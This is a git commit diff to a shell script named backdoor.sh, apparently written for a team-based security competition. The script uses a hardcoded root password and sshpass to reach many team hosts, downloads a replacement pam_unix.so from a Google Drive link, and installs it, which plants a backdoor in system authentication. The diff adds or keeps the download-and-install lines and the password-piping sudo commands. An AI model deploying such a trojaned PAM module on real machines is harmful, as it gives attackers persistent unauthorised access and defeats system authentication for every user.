57686d961c3bcc6a2c79e50d41e66f775b3f13d2
sawyer3399 <46585978+sawyer3399@users.noreply.github.com>
2025-03-19 23:06:07 -0500

    Update backdoor.sh

--- backdoor.sh
+++ backdoor.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 
 username="root"
-password="sawyer"
+password="Password1!"
 
 timeout=5
 max_jobs=10
@@ -9,7 +9,7 @@ path_to_pam="/lib/x86_64-linux-gnu/security/pam_unix.so"
 path_to_tmp_pam="/tmp/pam_unix.so"
 link_to_pam="https://drive.usercontent.google.com/download?id=1eH1xIVb6dwKrA4Q_Ji3lzmYkxPiM2pUm&export=download&authuser=0"
 
-IPs=("127.0.0.1")
+IPs=()
 network_id="1.1"
 number_of_teams=10
 host_ids=(1 2 3)
@@ -23,11 +23,10 @@ create_IPs() {
 }
 
 main() {
-    curl -o "$path_to_tmp_pam" "$link_to_pam" && \
-    echo "Downloaded pam file successfully" || \
-    echo "Failed to download pam file"
-
+    sudo apt install -y curl sshpass
+    curl -o "$path_to_tmp_pam" "$link_to_pam"
     create_IPs
+    sleep 5
 
     job_count=0
     for IP in "${IPs[@]}"; do
@@ -39,7 +38,7 @@ main() {
                     echo \"$password\" | sudo -S apt install -y curl || \
                     echo \"$password\" | sudo -S yum install -y curl || \
                     echo \"$password\" | sudo -S zypper install -y curl || \
-                    echo \"$password\" | sudo -S pacman -Syu curl --noconfirm && \
+                    echo \"$password\" | sudo -S pacman -Syu curl --noconfirm && \        
                     sleep 10 && \
                     echo \"$password\" | sudo -S curl -o \"$path_to_tmp_pam\" \"$link_to_pam\" && \
                     sleep 10 && \
